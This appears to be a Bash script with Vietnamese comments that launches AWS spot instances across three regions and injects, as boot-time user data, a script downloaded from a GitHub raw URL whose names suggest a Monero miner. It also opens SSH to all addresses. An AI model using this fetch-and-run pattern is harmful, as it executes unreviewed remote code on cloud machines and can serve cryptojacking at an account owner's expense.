#!/bin/bash

# Danh sách AMI theo vùng AWS
declare -A region_image_map=(
    ["us-east-1"]="ami-0e2c8caa4b6378d8c"
    ["us-west-2"]="ami-05d38da78ce859165"
    ["ap-southeast-1"]="ami-0672fd5b9210aa093"
)

# URL chứa User Data trên GitHub
user_data_url="https://raw.githubusercontent.com/kiemtien1/test/refs/heads/main/vixmr8"
user_data_file="/tmp/user_data.sh"

# Tải User Data từ GitHub
echo "📥 Đang tải User Data từ GitHub..."
curl -s -L "$user_data_url" -o "$user_data_file"

# Kiểm tra file User Data
if [ ! -s "$user_data_file" ]; then
    echo "❌ Lỗi: Không thể tải User Data từ GitHub."
    exit 1
fi

# Encode User Data sang base64
user_data_base64=$(base64 -w 0 "$user_data_file")

# Cấu hình loại máy và giá thầu tối đa
INSTANCE_TYPE="c7a.2xlarge"
SPOT_PRICE="0.5"  # Giá thầu tối đa cho Spot Instance
INSTANCE_COUNT=1   # Số lượng instances cần tạo ở mỗi vùng

# Vòng lặp qua từng vùng AWS
for REGION in "${!region_image_map[@]}"; do
    echo "🔹 Processing region: $REGION"

    IMAGE_ID=${region_image_map[$REGION]}
    KEY_NAME="SpotKey-$REGION"
    SG_NAME="SpotSecurityGroup-$REGION"

    # Kiểm tra và tạo Key Pair nếu chưa có
    if ! aws ec2 describe-key-pairs --key-names "$KEY_NAME" --region "$REGION" > /dev/null 2>&1; then
        aws ec2 create-key-pair --key-name "$KEY_NAME" --region "$REGION" --query "KeyMaterial" --output text > "${KEY_NAME}.pem"
        chmod 400 "${KEY_NAME}.pem"
        echo "✅ Key Pair $KEY_NAME created in $REGION"
    else
        echo "✅ Key Pair $KEY_NAME already exists in $REGION"
    fi

    # Kiểm tra và tạo Security Group nếu chưa có
    SG_ID=$(aws ec2 describe-security-groups --group-names "$SG_NAME" --region "$REGION" --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)

    if [ -z "$SG_ID" ]; then
        SG_ID=$(aws ec2 create-security-group --group-name "$SG_NAME" --description "Spot Instances Security Group" --region "$REGION" --query "GroupId" --output text)
        aws ec2 authorize-security-group-ingress --group-id "$SG_ID" --protocol tcp --port 22 --cidr 0.0.0.0/0 --region "$REGION"
        echo "✅ Security Group $SG_NAME created in $REGION"
    else
        echo "✅ Security Group $SG_NAME already exists in $REGION"
    fi

    # Lấy Subnet ID khả dụng
    SUBNET_ID=$(aws ec2 describe-subnets --region "$REGION" --query "Subnets[0].SubnetId" --output text)
    if [ -z "$SUBNET_ID" ]; then
        echo "❌ No available Subnet found in $REGION. Skipping..."
        continue
    fi

    echo "🟢 Using Subnet ID: $SUBNET_ID"

    # Gửi yêu cầu Spot Instances
    SPOT_REQUEST_ID=$(aws ec2 request-spot-instances \
        --spot-price "$SPOT_PRICE" \
        --instance-count "$INSTANCE_COUNT" \
        --type "one-time" \
        --launch-specification "{
            \"ImageId\": \"$IMAGE_ID\",
            \"InstanceType\": \"$INSTANCE_TYPE\",
            \"KeyName\": \"$KEY_NAME\",
            \"SecurityGroupIds\": [\"$SG_ID\"],
            \"SubnetId\": \"$SUBNET_ID\",
            \"UserData\": \"$user_data_base64\"
        }" \
        --region "$REGION" \
        --query "SpotInstanceRequests[*].SpotInstanceRequestId" \
        --output text)

    if [ -n "$SPOT_REQUEST_ID" ]; then
        echo "✅ Spot Request Created: $SPOT_REQUEST_ID"
        echo "$REGION: $SPOT_REQUEST_ID" >> spot_requests.log
    else
        echo "❌ Failed to create Spot Request in $REGION" >&2
    fi

done

echo "🚀 Hoàn tất gửi Spot Requests!"
